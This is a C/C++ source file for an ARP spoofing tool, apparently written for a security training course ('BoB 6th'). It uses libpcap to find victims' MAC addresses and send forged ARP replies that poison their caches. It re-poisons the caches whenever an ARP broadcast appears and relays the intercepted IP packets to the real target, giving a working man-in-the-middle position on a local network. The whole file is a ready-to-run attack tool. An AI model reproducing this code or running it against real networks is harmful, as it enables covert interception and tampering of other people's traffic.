// BoB 6th ARP Spoofing -- code by BadSpell(KJS)
#include <stdio.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <string.h>
#include <map>
using namespace std;

typedef enum _ARP_OPCODE
{
	ARP_Request = 1,
	ARP_Reply = 2,
} ARP_OPCODE;

typedef struct _ETHER_HEADER
{
	u_int8_t destHA[6];
	u_int8_t sourceHA[6];
	u_int16_t type;
} __attribute__((packed)) ETHER_HEADER, *LPETHER_HEADER;

typedef struct _ARP_HEADER
{
    u_int16_t hardwareType;
    u_int16_t protocolType;
    u_char hardwareAddressLength;
    u_char protocolAddressLength;
    u_int16_t operationCode;
    u_int8_t senderHA[6];
    u_int32_t senderIP;
    u_int8_t targetHA[6];
    u_int32_t targetIP;
} __attribute__((packed)) ARP_HEADER, *LPARP_HEADER;

typedef struct _IP_HEADER
{
	uint8_t version;
	uint8_t dscp;
	uint16_t totalLength;
	uint16_t id;
	uint16_t flag;
	uint8_t ttl;
	uint8_t protocol;
	uint16_t headerCheckSum;
	uint32_t senderIP;
	uint32_t targetIP;
}  __attribute__((packed)) IP_HEADER, *LPIP_HEADER;

map <uint32_t, u_int8_t *> targetMacTable;
uint8_t localMacAddress[6];
uint32_t localIPAddress;
u_char **packetTable;
uint32_t *ipSourceTable, *ipTargetTable;
pcap_t *handle;
const u_char *captured_packet;
struct pcap_pkthdr *header;
int pn_result;

u_int8_t *getMacAddressByIP(uint32_t ipAddress)
{
	u_char packet[1500];
	LPETHER_HEADER etherHeader = (LPETHER_HEADER)packet;

	memcpy(etherHeader->destHA, "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
	memcpy(etherHeader->sourceHA, localMacAddress, 6);
	etherHeader->type = ntohs(ETHERTYPE_ARP);

	LPARP_HEADER arpHeader = (LPARP_HEADER)(packet + sizeof(ETHER_HEADER));
	arpHeader->hardwareType = ntohs(1);
	arpHeader->protocolType = ntohs(ETHERTYPE_IP);
	arpHeader->hardwareAddressLength = 6;
	arpHeader->protocolAddressLength = 4;
	arpHeader->operationCode = ntohs(ARP_Request);
	arpHeader->senderIP = localIPAddress;
	arpHeader->targetIP = ipAddress;
	memcpy(arpHeader->senderHA, localMacAddress, 6);
	memcpy(arpHeader->targetHA, "\x00\x00\x00\x00\x00\x00", 6);

	pcap_sendpacket(handle, packet, sizeof(ETHER_HEADER) + sizeof(ARP_HEADER));

	uint8_t *victimHA = new uint8_t[6];
	while ((pn_result = pcap_next_ex(handle, &header, &captured_packet)) >= 0)
	{
		if (!pn_result)
			continue;

		LPETHER_HEADER capturedEtherHeader = (LPETHER_HEADER)captured_packet;
		if (ntohs(capturedEtherHeader->type) != ETHERTYPE_ARP)
			continue;

		LPARP_HEADER capturedArpHeader = (LPARP_HEADER)(captured_packet + sizeof(ETHER_HEADER));
		if (ntohs(capturedArpHeader->protocolType) == ETHERTYPE_IP &&
			ntohs(capturedArpHeader->operationCode) == ARP_Reply &&
			capturedArpHeader->senderIP == arpHeader->targetIP)
		{
			memcpy(victimHA, capturedArpHeader->senderHA, 6);
			break;
		}
	}
	return victimHA;
}

u_char *makeARPSpoofPacket(uint32_t sender_ip, uint32_t target_ip)
{
	u_char *packet = new u_char[1500];
	LPETHER_HEADER etherHeader = (LPETHER_HEADER)packet;
	u_int8_t *victimHA = getMacAddressByIP(sender_ip);

	memcpy(etherHeader->destHA, victimHA, 6);
	memcpy(etherHeader->sourceHA, localMacAddress, 6);
	etherHeader->type = ntohs(ETHERTYPE_ARP);

	LPARP_HEADER arpHeader = (LPARP_HEADER)(packet + sizeof(ETHER_HEADER));

	arpHeader->hardwareType = ntohs(1);
	arpHeader->protocolType = ntohs(ETHERTYPE_IP);
	arpHeader->hardwareAddressLength = 6;
	arpHeader->protocolAddressLength = 4;
	arpHeader->operationCode = ntohs(ARP_Reply);
	arpHeader->senderIP = target_ip;
	arpHeader->targetIP = sender_ip;
	memcpy(arpHeader->senderHA, localMacAddress, 6);
	memcpy(arpHeader->targetHA, victimHA, 6);
	delete victimHA;
	return packet;
}

int main(int argc, char **argv)
{
	char errbuf[PCAP_ERRBUF_SIZE];
	char *dev, *sender_ip, *target_ip;
	struct ifreq if_mac, if_ip;
	int sockfd, session;

	if (argc < 4 || argc % 2)
	{
		printf("Usage: %s [interface] [sender ip] [target ip] | [sender2 ip] [target2 ip] ...\n", argv[0]);
		return 2;
	}
	dev = argv[1];
	if ((handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf)) == NULL)
	{
		printf("[-] Couldn't open device %s: %s\n", dev, errbuf);
		return 2;
	}
	if ((sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW)) == -1)
	{
		printf("[-] Open Raw socket error.\n");
		return 2;
	}
	session = (argc  - 2) / 2;
	packetTable = new u_char *[session];
	ipSourceTable = new uint32_t [session];
	ipTargetTable = new uint32_t [session];

	// Get local MAC Address and IP
	strncpy(if_mac.ifr_name, dev, IFNAMSIZ - 1);
	strncpy(if_ip.ifr_name, dev, IFNAMSIZ - 1);
	ioctl(sockfd, SIOCGIFHWADDR, &if_mac);
	ioctl(sockfd, SIOCGIFADDR, &if_ip);
	memcpy(localMacAddress, if_mac.ifr_hwaddr.sa_data, 6);
	localIPAddress = ((struct sockaddr_in *)&if_ip.ifr_addr)->sin_addr.s_addr;

	printf("[*] Creating ARP packet ...\n");
	for (int i = 0; i < session; i++)
	{
		sender_ip = argv[i * 2 + 2], target_ip = argv[i * 2 + 3];
		ipSourceTable[i] = inet_addr(sender_ip);
		ipTargetTable[i] = inet_addr(target_ip);
		packetTable[i] = makeARPSpoofPacket(ipSourceTable[i], ipTargetTable[i]);
		targetMacTable[ipSourceTable[i]] = getMacAddressByIP(ipTargetTable[i]);
	}
	printf("[!] Start ARP spoofing !! (%d session)\n", session);
	for (int i = 0; i < session; i++)
		pcap_sendpacket(handle, packetTable[i], sizeof(ETHER_HEADER) + sizeof(ARP_HEADER));

	while ((pn_result = pcap_next_ex(handle, &header, &captured_packet)) >= 0)
	{
		if (!pn_result)
			continue;

		LPETHER_HEADER capturedEtherHeader = (LPETHER_HEADER)captured_packet;

		if (ntohs(capturedEtherHeader->type) == ETHERTYPE_ARP)
		{
			if (!memcmp(capturedEtherHeader->destHA, "\xFF\xFF\xFF\xFF\xFF\xFF", 6))
			{
				printf("[!] Received ARP broadcast and send ARP Spoofing\n");
				for (int i = 0; i < session; i++)
					pcap_sendpacket(handle, packetTable[i], sizeof(ETHER_HEADER) + sizeof(ARP_HEADER));
			}
		}
		else if (ntohs(capturedEtherHeader->type) == ETHERTYPE_IP)
		{
			LPIP_HEADER capturedIpHeader = (LPIP_HEADER)(captured_packet + sizeof(ETHER_HEADER));
			for (int i = 0; i < session; i++)
			{
				if (!memcmp(capturedEtherHeader->destHA, localMacAddress, 6) &&
					(capturedIpHeader->senderIP == ipSourceTable[i] || capturedIpHeader->targetIP == ipTargetTable[i]))
				{
					printf("[+] Relay Session[%d] szPacket[%d]\n", i, header->caplen);
					memcpy(capturedEtherHeader->destHA, targetMacTable[ipSourceTable[i]], 6);
					pcap_sendpacket(handle, captured_packet, header->caplen);
				}
			}
		}
	}
	pcap_close(handle);
	return 0;
}